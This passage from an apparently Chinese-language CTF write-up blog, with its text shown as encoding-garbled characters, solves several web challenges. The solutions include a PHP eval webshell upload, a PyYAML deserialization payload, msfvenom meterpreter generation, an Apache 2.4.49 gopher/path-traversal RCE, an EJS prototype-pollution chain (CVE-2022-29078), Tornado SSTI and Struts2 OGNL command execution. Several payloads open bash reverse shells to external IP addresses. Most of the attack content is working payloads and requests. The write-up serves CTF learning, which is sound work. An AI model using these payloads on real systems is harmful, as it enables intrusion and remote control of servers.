'POST'])\ndef upload():\n\n    if request.method == 'GET':\n        return redirect('/')\n\n    if request.method == 'POST':\n        upFile = request.files['file']\n        print(upFile)\n        if re.search(r\"\\.\\.|/\", upFile.filename, re.M|re.I) != None:  #åŒ¹é…ä¸Šä¼ çš„æ–‡ä»¶ååŒ…ä¸åŒ…æ‹¬..æˆ–è€…/å¹¶ä¸”åŒ¹é…å¤šè¡Œå’Œå¤§å°å†™\n            return \"<script>alert('Hacker!');window.location.href='/upload'</script>\"\n\n        savePath = f\"uploads/{upFile.filename}\"\n        print(savePath) \n        upFile.save(savePath) #ä¿å­˜æ–‡ä»¶\n\n        if tarfile.is_tarfile(savePath):  #ç”¨äºæ£€æŸ¥ç»™å®šçš„æ–‡ä»¶è·¯å¾„ savePath æ˜¯å¦æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„tarå‹ç¼©æ–‡ä»¶\n            zipDatas = extractFile(savePath, 'tar')\n            return render_template('result.html', path=savePath, files=zipDatas)\n        else:\n            return f\"<script>alert('{upFile.filename} upload successfully');history.back(-1);</script>\"\n\n\n@app.route('/src', methods=['GET'])\ndef src():\n    if request.args:\n        username = request.args.get('username')\n        with open(f'config/{username}.yaml', 'rb') as f: #æ‰“å¼€yamlæ–‡ä»¶\n            Config = yaml.load(f.read()) #ååºåˆ—åŒ–ç‚¹\n            return render_template('admin.html', username=\"admin\", message=\"success\")\n    else:\n        return render_template('index.html')\n\n\nif __name__ == '__main__':\n    app.run(host='127.0.0.1', port=8000)\n```\n\nå¤§æ¦‚åˆ†æåœ¨æºç æ³¨é‡Šäº† å¤§è‡´å°±éœ€è¦æˆ‘ä»¬è¿›è¡Œä¸€ä¸ªè·¯å¾„ç©¿è¶Šå°†æˆ‘ä»¬ä¸Šä¼ åè§£å‹çš„æ–‡ä»¶ç©¿è¶Šåˆ°`config/`è¿™æ ·æˆ‘ä»¬çš„æ¶æ„æ–‡ä»¶æ‰ä¼šè¢«æ‰“å¼€å¹¶ä¸”è¿›è¡Œyamlååºåˆ—åŒ–\n\nè€ƒç‚¹ï¼štarçš„zipslipæ–‡ä»¶è¦†ç›–ï¼Œyamlååºåˆ—åŒ–\n\næ–‡ä»¶å†…å®¹ä¸º`!!python/object/apply:os.system [\"whoami\"]`æ”¹ä¸ºåå¼¹shellå°±è¡Œ æ¥è‡ªhttps://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/#pythonobjectapply æˆ‘æ„¿ç§°ä¹‹ä¸ºç‹ã®å®åº“\n\nä¹‹åå°±æ˜¯æ‰“åŒ…äº†`tar cPvf a.tar ../../config/a.yaml`\n\nç„¶åä¸Šä¼  è®¿é—®/srcè·¯ç”± ä¼ å‚usename=a å³å¯è§¦å‘åå¼¹shell\n\n## Ez_java\n\nä¸ä¼š æ²¡å­¦\n\n## Ez_web\n\nè€ƒç‚¹ï¼š\n\n- /etc/ld.so.preloadé…ç½®æ–‡ä»¶ åŠ«æŒ\n\nç®€å•ç†è§£åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­æˆ‘ä»¬å¯ä»¥è®¾ç½®ä¸€äº›æ¶æ„çš„æ–‡ä»¶ç»å¯¹è·¯å¾„\n\nç„¶ååœ¨æˆ‘ä»¬è¾“å…¥æŒ‡ä»¤æ—¶ å°±ä¼šå…ˆé¢„åŠ è½½`ld.so.preload`è¿™ä¸ªæ–‡ä»¶ä¸­çš„å†…å®¹ è¾¾åˆ°åŠ«æŒæ•ˆæœ\n\næ‰€ä»¥è¿™é“å¤§è‡´é¢˜ç›®æ€è·¯:\n\n1. å…ˆç”±msfç”Ÿæˆä¸€ä¸ªæœ¨é©¬ ç„¶åä¸Šä¼ ä¸Šå»\n2. ç„¶ååœ¨è‡ªå·±vps èµ·msfconsole è®¾ç½®å¥½ç›¸åº”çš„å‚æ•° å¼€å§‹ç›‘å¬ç­‰å¾…åå¼¹\n3. ç„¶ååœ¨é¢˜ç›®ä¸­éšä¾¿æ‰§è¡Œä¸€ä¸ªæŒ‡ä»¤å°±ä¼šè¢«åŠ«æŒäº†\n\nç”±äºæˆ‘æ²¡æœ‰ç¯å¢ƒåªèƒ½å¤§è‡´å¤ç°ä¸€ä¸‹ å› ä¸ºå¤ç°è¿˜ç»™è‡ªå·±kaliè™šæ‹Ÿæœºæ•´å´©äº† \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694094226089-5913781d-64aa-45ea-a2b2-59f67b604c93.jpeg)\n\n```plain\n#ç”Ÿæˆæœ¨é©¬ è¿™é‡Œæœ‰ä¸ªç‚¹å°±æ˜¯æˆ‘åªèƒ½åœ¨æˆ‘vpsçš„/rootä¸‹ç”Ÿæˆæœ¨é©¬ å…¶ä»–åœ°æ–¹ç”Ÿæˆæ—¶éƒ½æ˜¯permission denied å°±ç®—ç»™äº†777éƒ½æ˜¯è¿™æ ·\nmsfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=vpsçš„ip LPORT=1000 -f elf-so -o evil.elf\nç„¶åä¾æ¬¡æ‰§è¡Œä»¥ä¸‹å‘½ä»¤:\n#é€‰æ‹©æ”»å‡»è½½è·:\nuse payload/linux/x64/meterpreter/reverse_tcp \n#å±•ç¤ºç›¸å…³ä¿¡æ¯\nshow options\n#è®¾ç½®åå¼¹æ¥å—shellçš„ä¸»æœºip è¿™é‡Œè®¾ç½®æˆæœ¬æœº\nset lhost 0.0.0.0\n#ç›‘å¬ip è¿™é‡Œå½“æ—¶ç”Ÿæˆæœ¨é©¬æ—¶ç«¯å£æ˜¯å¤šå°‘ å°±è¦è®¾ç½®æˆå¤šå°‘\nset lport 1000\n#å¼€å§‹æ‰§è¡Œåˆ©ç”¨\nexploit\n```\n\nå‚è€ƒäº:\n\nhttps://blog.csdn.net/whatday/article/details/108890018\n\nhttps://www.anquanke.com/post/id/254388\n\n[http://162.14.111.237/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E4%B8%ADlinux%E5%BA%93%E6%96%87%E4%BB%B6%E5%8A%AB%E6%8C%81/](http://162.14.111.237/åº”æ€¥å“åº”ä¸­linuxåº“æ–‡ä»¶åŠ«æŒ/)\n\nhttps://www.freebuf.com/column/162604.html\n\néƒ½æ˜¯ä¸Šå¥½çš„æ–‡ç« \n\n# Misc\n\n## EZ_misc\n\nè·Ÿä¹‹å‰*CTFè€ƒç‚¹ä¸€æ · CVE-2023-28303\n\nhttps://github.com/frankthetank-music/Acropalypse-Multi-Tool ç›´æ¥ç”¨å·¥å…·æ¢­å“ˆæ¢å¤å°±è¡Œäº†\n","categories":["å„èµ›äº‹WP"]},{"title":"NSSCTF 2nd WPä¸å­¦ä¹ ","url":"/post/c7a57718.html","content":"\nå­¦ä¹ \n\n<!--more-->\n\n# phpç­¾åˆ°\n\n```php\n<?php\n \n function waf($filename){\n     $black_list = array(\"ph\", \"htaccess\", \"ini\");\n     $ext = pathinfo($filename, PATHINFO_EXTENSION);\n     foreach ($black_list as $value) {\n         if (stristr($ext, $value)){\n             return false;\n         }\n     }\n     return true;\n }\n \n if(isset($_FILES['file'])){\n     $filename = urldecode($_FILES['file']['name']);\n     $content = file_get_contents($_FILES['file']['tmp_name']);\n     if(waf($filename)){\n         file_put_contents($filename, $content);\n     } else {\n         echo \"Please re-upload\";\n     }\n } else{\n     highlight_file(__FILE__);\n }\n```\n\nä¸€é“æ–‡ä»¶ä¸Šä¼ çš„é¢˜ç›®ï¼Œä¸»è¦å°±æ˜¯åç¼€åæ€ä¹ˆå»ç»•è¿‡pathinfo()å‡½æ•°\n\nå‚è€ƒä»¥ä¸‹æ–‡ç« \n\nhttps://www.freesion.com/article/7470682764/\n\nhttps://www.anquanke.com/post/id/253383\n\n> åœ¨æ“ä½œç³»ç»Ÿä¸­ï¼Œéƒ½æ˜¯ç¦æ­¢ä½¿ç”¨/ä½œä¸ºæ–‡ä»¶åçš„ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆåé¢åŠ ä¸€ä¸ª.å°±å¯ä»¥æˆåŠŸçš„å†™å…¥1.phpäº†ã€‚\n\n> $pathinfo[extension]=pathfo($name,PATHINFO_EXTENSION) è·å–æ–‡ä»¶åç¼€åæ—¶æ—¶è·å–çš„ . åé¢çš„å†…å®¹ï¼Œå½“å‡ºç°å¤šä¸ª . æ—¶ï¼Œç»“æœä¸ºæœ€åä¸€ä¸ª . åé¢çš„å†…å®¹ã€‚æ‰€ä»¥å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹æ€§å®ç°å¯¹åç¼€åæ£€æµ‹çš„ç»•è¿‡ã€‚\n\n æ‰€ä»¥ç”¨`/.`ç»•è¿‡å°±è¡Œ è®°å¾—è¦urlç¼–ç ä¸€ä¸‹\n\n```php\nPOST / HTTP/1.1\nHost: node6.anna.nssctf.cn:28316\nContent-Length: 332\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: null\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryznxIJaJoF11xMYcQ\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\n\n------WebKitFormBoundaryznxIJaJoF11xMYcQ\nContent-Disposition: form-data; name=\"file\"; filename=\"1.php%2F.\"\nContent-Type: application/octet-stream\n\nGIF89a\n<?php @eval($_POST['x']); ?>\n------WebKitFormBoundaryznxIJaJoF11xMYcQ\nContent-Disposition: form-data; name=\"submit\"\n\næäº¤\n------WebKitFormBoundaryznxIJaJoF11xMYcQ--\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1693108794590-ca64554b-c13d-4a28-b22a-be5854ad5ec9.png)\n\nä¸Šä¼ æˆåŠŸå å°±æ˜¯rceå³å¯\n\n# 2å‘¨å¹´å¿«ä¹ï¼\n\nè¿›å…¥é¢˜ç›®ä¸­win12ç³»ç»Ÿ ç”¨é‡Œé¢çš„cmdå‘ä¸ª`curl https://www.nssctf.cn/flag`å°±èƒ½åœ¨nssç«™å†…æ”¶åˆ°flagé‚®ä»¶äº†\n\n# MyBox\n\néé¢„æœŸäº† ç›´æ¥`file:///proc/1/environ`flagå°±åœ¨ç¯å¢ƒå˜é‡ä¸­\n\n# MyBox(revenge)\n\nä¸€é“gopheråè®® æ‰“apache2.4.49 ssrf+è·¯å¾„ç©¿è¶ŠRCEçš„é¢˜ç›®\n\nåšé¢˜æ ¹æœ¬æƒ³ä¸åˆ°\n\né¦–å…ˆ`file:///app/app.py`è·å¾—æºç \n\n```javascript\nfrom flask import Flask, request, redirect\nimport requests, socket, struct\nfrom urllib import parse\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    if not request.args.get('url'):\n        return redirect('/?url=dosth')\n    url = request.args.get('url')\n    if url.startswith('file://'):\n        if 'proc' in url or 'flag' in url:\n            return 'no!'\n        with open(url[7:], 'r') as f:\n            data = f.read()\n            if url[7:] == '/app/app.py':\n                return data\n            if 'NSSCTF' in data:\n                return 'no!'\n            return data\n    elif url.startswith('http://localhost/'):\n        return requests.get(url).text\n    elif url.startswith('mybox://127.0.0.1:'):\n        port, content = url[18:].split('/_', maxsplit=1)\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(5)\n        s.connect(('127.0.0.1', int(port)))\n        s.send(parse.unquote(content).encode())\n        res = b''\n        while 1:\n            data = s.recv(1024)\n            if data:\n                res += data\n            else:\n                break\n        return res\n    return ''\n\napp.run('0.0.0.0', 827)\n```\n\nå…ˆå‘åŒ…çœ‹çœ‹80ç«¯å£ å·çš„å¤§ä½¬çš„\n\n```plain\nmybox://127.0.0.1:80/_GET%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AUser-Agent%253A%2520curl/7.43.0%250D%250AAccept%253A%2520%252A/%252A%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25200%250D%250A%250D%250A%250D%250A\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1693302700270-2d5a5ce7-2e33-42ce-97bd-3b9900eb3611.png)\n\næ˜¾ç¤ºapahce2.4.49 ç„¶åæ˜¯ä¸€ä¸ªgopher+è·¯å¾„ç©¿è¶Šrce\n\nå‚è€ƒï¼šhttps://classic0796.com/index.php/archives/6/\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1693305404147-d17547c7-5ee8-49b1-a441-776cbe6dc0ca.jpeg)\n\nå¯ä»¥æ„é€ è¿™ç§è¯·æ±‚åŒ…æ¥rce\n\nç›´æ¥ç”¨godè„šæœ¬ ä¸ç”¨æ‰‹åŠ¨å»æ„é€ `%0D%0A` \n\nè¿˜æœ‰ä¸€ä¸ªå°ç‚¹æ˜¯é‚£ä¸ª`_` ä¸€å®šè¦åŠ ä¸ç„¶ä¼šå°†ä¹‹åæ•°æ®ç¬¬ä¸€ä¸ªå­—ç¬¦åäº† å‚è€ƒ:https://cloud.tencent.com/developer/article/1610645\n\nè¿˜æœ‰ä¸€ä¸ªå°ç‚¹å°±æ˜¯æˆ‘ä»¬éƒ½çŸ¥é“ä¸‰ä¸ªåŒå¼•å·æˆ–è€…å•å¼•å·åœ¨pythonä¸­æ˜¯æ³¨é‡Šç¬¦ ä½†æ˜¯ä¹Ÿå¯ä»¥è¢«å½“ä½œç”¨æ¥æ‹¬æ™®é€šå­—ç¬¦ä¸²çš„qwq\n\n```javascript\nfrom urllib.parse import quote\ntest =\\\n\"\"\"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1\nHost: 127.0.0.1\nUser-Agent: curl/7.68.0\nContent-Length:59\n\necho;bash -c \"bash -i >& /dev/tcp/8.130.34.53/7777 <&1\"\n\"\"\"\n#http://node6.anna.nssctf.cn:28949/?url=mybox://127.0.0.1:80/_POST%2520/cgi-bin/.%25252e/.%25252e/.%25252e/.%25252e/bin/sh%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AUser-Agent%253A%2520curl/7.68.0%250D%250AContent-Length%253A59%250D%250A%250D%250Aecho%253Bbash%2520-c%2520%2522bash%2520-i%2520%253E%2526%2520/dev/tcp/114.116.119.253/7777%2520%253C%25261%2522%250D%250A\ntmp = quote(test)\nnew = tmp.replace('%0A','%0D%0A')\nprint(new)\nresult='_'+quote(new)\n#post\n#result = '_'+new\ncommon=\"gopher://127.0.0.1:80/\"\nprint(quote(common)+result)\n```\n\n# MyJs\n\næºç å¦‚ä¸‹ï¼š\n\n```javascript\nconst express = require('express');\nconst bodyParser = require('body-parser');\nconst lodash = require('lodash');\nconst session = require('express-session');\nconst randomize = require('randomatic');\nconst jwt = require('jsonwebtoken')\nconst crypto = require('crypto');\nconst fs = require('fs');\n\nglobal.secrets = [];\n\nexpress()\n  .use(bodyParser.urlencoded({extended: true}))\n  .use(bodyParser.json())\n  .use('/static', express.static('static'))\n  .set('views', './views')\n  .set('view engine', 'ejs')\n  .use(session({\n    name: 'session',\n    secret: randomize('a', 16),\n    resave: true,\n    saveUninitialized: true\n  }))\n  .get('/', (req, res) => {\n    if (req.session.data) {\n      res.redirect('/home');\n    } else {\n      res.redirect('/login')\n    }\n  })\n  .get('/source', (req, res) => {\n    res.set('Content-Type', 'text/javascript;charset=utf-8');\n    res.send(fs.readFileSync(__filename));\n  })\n  .all('/login', (req, res) => {\n    if (req.method == \"GET\") {\n      res.render('login.ejs', {msg: null});\n    }\n    if (req.method == \"POST\") {\n      const {username, password, token} = req.body;\n      const sid = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()).secretid;\n\n      if (sid === undefined || sid === null || !(sid < global.secrets.length && sid >= 0)) {\n        return res.render('login.ejs', {msg: 'login error.'});\n      }\n      const secret = global.secrets[sid];\n      const user = jwt.verify(token, secret, {algorithm: \"HS256\"});\n      if (username === user.username && password === user.password) {\n        req.session.data = {\n          username: username,\n          count: 0,\n        }\n        res.redirect('/home');\n      } else {\n        return res.render('login.ejs', {msg: 'login error.'});\n      }\n    }\n  })\n  .all('/register', (req, res) => {\n    if (req.method == \"GET\") {\n      res.render('register.ejs', {msg: null});\n    }\n    if (req.method == \"POST\") {\n      const {username, password} = req.body;\n      if (!username || username == 'nss') {\n        return res.render('register.ejs', {msg: \"Username existed.\"});\n      }\n      const secret = crypto.randomBytes(16).toString('hex');\n      const secretid = global.secrets.length;\n      global.secrets.push(secret);\n      const token = jwt.sign({secretid, username, password}, secret, {algorithm: \"HS256\"});\n      res.render('register.ejs', {msg: \"Token: \" + token});\n    }\n  })\n  .all('/home', (req, res) => {\n    if (!req.session.data) {\n      return res.redirect('/login');\n    }\n    res.render('home.ejs', {\n      username: req.session.data.username||'NSS',\n      count: req.session.data.count||'0',\n      msg: null\n    })\n  })\n  .post('/update', (req, res) => {\n    if(!req.session.data) {\n      return res.redirect('/login');\n    }\n    if (req.session.data.username !== 'nss') {\n      return res.render('home.ejs', {\n        username: req.session.data.username||'NSS',\n        count: req.session.data.count||'0',\n        msg: 'U cant change uid'\n      })\n    }\n    let data = req.session.data || {};\n    req.session.data = lodash.merge(data, req.body);\n    console.log(req.session.data.outputFunctionName);\n    res.redirect('/home');\n  })\n  .listen(827, '0.0.0.0')\n```\n\nå…ˆæ˜¯ejsç©ºå¯†é’¥ç¼ºé™·  å…ˆæ³¨å†Œè·å–ä¸€ä¸ªæ—¶é—´æˆ³\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1693295357231-d4fb9748-a150-45a3-9899-f1196b7d9dd1.png)\n\nsidä¸ºtokenä¸­çš„secretidï¼Œç›´æ¥å–æ•°ç»„è®©å…¶æŠ¥é”™ä¸ºundefined\n\nçœ‹å¤§ä½¬å¸ˆå‚…çš„åšå®¢æ˜¯å› ä¸ºjwtç©ºç®—æ³•æ”»å‡»å¯¼è‡´å¯ä¼ªé€ \n\nå®˜æ–¹ï¼š\n\n1. verifyæ—¶æ­£ç¡®çš„å‚æ•°æ˜¯algorithmsè€Œä¸æ˜¯algorithmï¼Œæ‰€ä»¥è¿™é‡Œæœ¬è´¨ä¼ äº†ä¸ªç©ºåŠ å¯†ï¼Œå¯¼è‡´å…è®¸ç©ºå¯†é’¥ï¼Œæˆ‘ä»¬æ— é¡»è·å¾—JWTå¯†é’¥ï¼ˆé«˜ç‰ˆæœ¬å·²ä¿®æ”¹ï¼‰ã€‚\n2. ç¬¬äºŒä¸ªæ˜¯å…³äºsidçš„å¼±æ¯”è¾ƒï¼Œå¦‚æœåªæ˜¯å…è®¸ç©ºå¯†é’¥çš„è¯æˆ‘ä»¬ä¸çŸ¥é“secretä¾ç„¶æ— æ³•verifyï¼Œè¿™é‡Œsidå¦‚æœä¼ ä¸ªæ•°ç»„å°±èƒ½è½»æ¾ç»•è¿‡åˆ¤æ–­å¹¶ä¸”\n   ![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1693370732570-c47d2a3a-0bca-483f-9443-c9ff1a6eb437.png)\n\nç„¶åæœ¬åœ°æ„é€ ä¸€ä¸ªnssè´¦å·çš„token\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1693293966734-19bd978f-198a-40c5-b080-5763ae755c45.png)\n\nç„¶åç™»å½• å¯ä»¥çœ‹åˆ°/updateè·¯ç”±ä¸‹å­˜åœ¨åŸå‹é“¾æ±¡æŸ“ ä¹‹åå°±æ˜¯å»æ‰¾é“¾å­ æ²¡æ‰¾åˆ°ã€‚ã€‚ã€‚ã€‚ä½èƒ½\n\n```javascript\npost('/update', (req, res) => {\n    if(!req.session.data) {\n      return res.redirect('/login');\n    }\n    if (req.session.data.username !== 'nss') {\n      return res.render('home.ejs', {\n        username: req.session.data.username||'NSS',\n        count: req.session.data.count||'0',\n        msg: 'U cant change uid'\n      })\n    }\n    let data = req.session.data || {};\n    req.session.data = lodash.merge(data, req.body);\n    console.log(req.session.data.outputFunctionName);\n    res.redirect('/home');\n  })\n```\n\næ˜¯é«˜ç‰ˆæœ¬ejs3.1.7çš„é“¾å­ ç»ˆäºæ‰¾åˆ°å‡ºå¤„äº†https://inhann.top/2023/03/26/ejs/ è¿˜æ˜¯ä¸ªcve å¦ˆçš„CVE-2022-29078\n\n```javascript\n{\"__proto__\":{\n  \"settings\":{\n    \"view options\":{\n      \"escapeFunction\":\"console.log;this.global.process.mainModule.require('child_process').execSync('bash -c \\\"bash -i >& /dev/tcp/8.130.34.53/7777 <&1\\\"');\",\n      \"client\":\"true\"\n    }\n}\n  }\n}\n```\n\næˆåŠŸ\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1693300087149-8b21e202-2dc4-45b3-87c9-373819daf28d.png)\n\n# MyHurricane\n\næºç å¦‚ä¸‹\n\n```javascript\nimport tornado.ioloop\nimport tornado.web\nimport os\n\nBASE_DIR = os.path.dirname(__file__)\n\ndef waf(data):\n    bl = ['\\'', '\"', '__', '(', ')', 'or', 'and', 'not', '{{', '}}']\n    for c in bl:\n        if c in data:\n            return False\n    for chunk in data.split():\n        for c in chunk:\n            if not (31 < ord(c) < 128):\n                return False\n    return True\n\nclass IndexHandler(tornado.web.RequestHandler):\n    def get(self):\n        with open(__file__, 'r') as f:\n            self.finish(f.read())\n    def post(self):\n        data = self.get_argument(\"ssti\")\n        if waf(data):\n            with open('1.html', 'w') as f:\n                f.write(f\"\"\"<html>\n                        <head></head>\n                        <body style=\"font-size: 30px;\">{data}</body></html>\n                        \"\"\")\n                f.flush()\n            self.render('1.html')\n        else:\n            self.finish('no no no')\n\nif __name__ == \"__main__\":\n    app = tornado.web.Application([\n            (r\"/\", IndexHandler),\n        ], compiled_template_cache=False)\n    app.listen(827)\n    tornado.ioloop.IOLoop.current().start()\n```\n\nä¸€çœ¼ä¸çœŸæ˜¯tornadoçš„sstiäº†  payloadå¤§è‡´ä¸Šå’Œæˆ‘ä»¬å­¦ä¹ flask sstiä¸€æ · éƒ½æœ‰ç¨æœ‰ä¸åŒ\n\nwafäº† `['\\'', '\"', '__', '(', ')', 'or', 'and', 'not', '{{', '}}']`\n\næˆ‘æ­»åœ¨äº†æ‹¬å·ä¸Š å½“æ—¶åœ¨æƒ³è¿æ‹¬å·éƒ½wafäº† æ€ä¹ˆäº†æ„é€ payloadå•Š\n\nä¹‹åå‘ç°å¤§ä½¬ä»¬æ ¹æœ¬ä¸ç”¨æ‹¬å·ã€‚ã€‚ã€‚ã€‚\n\nè¿˜æœ‰å°±æ˜¯åˆæœ‰éé¢„æœŸ\n\n## éé¢„æœŸ\n\nç›´æ¥ç”¨æ–‡ä»¶åŒ…å«\n\n```\n{% extend /proc/self/environ %}\n```\n\næˆ–è€…`{% include /proc/self/environ %}` å½“ç„¶è®°å¾—urlç¼–ç æ‰“å…¥\n\n## é¢„æœŸ\n\nè¿˜æœ‰å¦ä¸€ç§æ˜¯god çš„payload\n\n```javascript\nssti={%25 set _tt_utf8 =eval %25}{%25 raw request.body_arguments[request.method][0] %25}&POST=__import__('os').popen(\"bash -c 'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fip%2Fport%20%3C%261'\")\n```\n\n> è¿™ç§æ–¹æ³•åˆ©ç”¨äº†tornadoé‡Œçš„å˜é‡è¦†ç›–ï¼Œè®©__tt_utf8ä¸ºevalï¼Œåœ¨æ¸²æŸ“æ—¶æ—¶ä¼šæœ‰__tt_utf8(__tt_tmp)è¿™æ ·çš„è°ƒç”¨ï¼Œç„¶åè®©__tt_tmpä¸ºæ¶æ„å­—ç¬¦ä¸²å°±å¥½äº†ï¼Œæˆ‘fuzzäº†ä¸€ä¸‹ï¼Œä¸Šè¿°payloadä¸­rawè¯­å¥å¯ä»¥ç»™tmpèµ‹å€¼ï¼Œæ‰€ä»¥rce\n\n`{% raw *expr* %}`ï¼šå°±æ˜¯å¸¸è§„çš„æ¨¡æ¿è¯­å¥ï¼Œåªæ˜¯è¾“å‡ºä¸ä¼šè¢«è½¬ä¹‰\n\n`request.body_arguments`ï¼šrequest.body_arguments æ˜¯ Tornado æ¡†æ¶ä¸­çš„ä¸€ä¸ªå±æ€§ï¼Œç”¨äºè·å–å½“å‰ HTTP è¯·æ±‚ä¸­çš„è¡¨å•æ•°æ®æˆ–URLç¼–ç æ•°æ®ã€‚\n\nåœ¨ HTTP è¯·æ±‚ä¸­ï¼Œè¯·æ±‚ä½“ï¼ˆbodyï¼‰é€šå¸¸ç”¨äºä¼ è¾“ POST è¯·æ±‚ä¸­çš„è¡¨å•æ•°æ®æˆ– URL ç¼–ç æ•°æ®ã€‚request.body_arguments å¯ä»¥è§£æå¹¶è¿”å›è¿™äº›æ•°æ®çš„å­—å…¸å½¢å¼ã€‚\n\n`request.method`æ˜¯ Tornado æ¡†æ¶ä¸­çš„ä¸€ä¸ªå±æ€§ï¼Œç”¨äºè·å–å½“å‰ HTTP è¯·æ±‚çš„è¯·æ±‚æ–¹æ³•\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1693307041761-05276fd0-0b48-4d6a-ac04-e3d5e644a066.png)\n\næ¥è‡ª:[https://www.tr0y.wang/2022/08/05/SecMap-SSTI-tornado/#%E5%88%A9%E7%94%A8-httpserverrequest](https://www.tr0y.wang/2022/08/05/SecMap-SSTI-tornado/#åˆ©ç”¨-httpserverrequest)\n\nçœŸçš„å¤ªå¼ºäº†qwq åˆå­¦åˆ°æ–°å§¿åŠ¿äº†\n","categories":["å„èµ›äº‹WP"]},{"title":"ctfshow-java struts2æ¡†æ¶ä¸€è§ˆ","url":"/post/faf20676.html","content":"\nctfshow-java\n\n<!--more-->\n\n# å‰è¨€\n\nç¡¬ç€å¤´çš®å­¦ä¹ \n\nå¥½åƒè¿™ä¸ªç³»åˆ—è®²çš„å…¨æ˜¯struts2æ¡†æ¶æ¼æ´ å°±å½“ä½œæ˜¯é•¿è§è¯†äº†\n\nStruts2æ˜¯javaè¯­è¨€å†™çš„çš„ä¸€ä¸ªåŸºäºMVCè®¾è®¡æ¨¡å¼çš„Webæ¡†æ¶\n\nstruts2æ¼æ´ S2-001æ˜¯å½“ç”¨æˆ·æäº¤è¡¨å•æ•°æ®ä¸”éªŒè¯å¤±è´¥æ—¶ï¼ŒæœåŠ¡å™¨ä½¿ç”¨OGNLè¡¨è¾¾å¼è§£æç”¨æˆ·å…ˆå‰æäº¤çš„å‚æ•°å€¼ï¼Œ`%{value}`å¹¶é‡æ–°å¡«å……ç›¸åº”çš„è¡¨å•æ•°æ®ã€‚\n\nè¿™é‡Œçš„`%{value}`ç®€å•ç†è§£å°±æ˜¯å’Œflaskçš„æ¨¡æ¿æ³¨å…¥`{{}}`å·®ä¸å¤š ä¼šå¯¹é‡Œé¢çš„å†…å®¹è¿›è¡Œè§£æ\n\nå› æ­¤æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å…¶è¿›è¡Œå‘½ä»¤æ‰§è¡Œ\n\nOGNLè¡¨è¾¾å¼ä¸­ä¸‰ä¸ªç¬¦å· `% # $` çš„å«ä¹‰\n\n```plain\n%çš„ç”¨é€”æ˜¯åœ¨æ ‡å¿—çš„å±æ€§ä¸ºå­—ç¬¦ä¸²ç±»å‹æ—¶ï¼Œè®¡ç®—OGNLè¡¨è¾¾å¼%{}ä¸­çš„å€¼\n#çš„ç”¨é€”è®¿ä¸»è¦æ˜¯è®¿é—®éæ ¹å¯¹è±¡å±æ€§ï¼Œå› ä¸ºStruts 2ä¸­å€¼æ ˆè¢«è§†ä¸ºæ ¹å¯¹è±¡ï¼Œæ‰€ä»¥è®¿é—®å…¶ä»–éæ ¹å¯¹è±¡æ—¶ï¼Œéœ€è¦åŠ #å‰ç¼€æ‰å¯ä»¥è°ƒç”¨\n$ä¸»è¦æ˜¯åœ¨Struts 2é…ç½®æ–‡ä»¶ä¸­ï¼Œå¼•ç”¨OGNLè¡¨è¾¾å¼\n```\n\nå…¶æ¬¡struts2å¼•æ“æ˜¯æˆ‘ä»¬ç†Ÿæ‚‰çš„tomcat\n\ngithubä¸Šæœ‰ä¸“é—¨é’ˆå¯¹struts2çš„poc https://github.com/HatBoy/Struts2-Scan ä¸è¿‡æˆ‘è¿˜æ˜¯è‡ªå·±æ‰‹åŠ¨æ¯é¥¬ä¸€ä¸‹\n\n# WEB-279(S2-001)\n\nè·å–ä¸€äº›æ•æ„Ÿè·¯å¾„çš„payload:\n\n```plain\n// è·å–tomcatè·¯å¾„\n%{\"tomcatBinDir{\"+@java.lang.System@getProperty(\"user.dir\")+\"}\"}\n\n// è·å–webè·¯å¾„\n%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\").getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()}\n```\n\næœ¬é¢˜payload:\n\n```plain\n// å‘½ä»¤æ‰§è¡Œ envï¼Œflagåœ¨ç¯å¢ƒå˜é‡ä¸­\npassword=%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{\"env\"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}&username=1\n```\n\n# 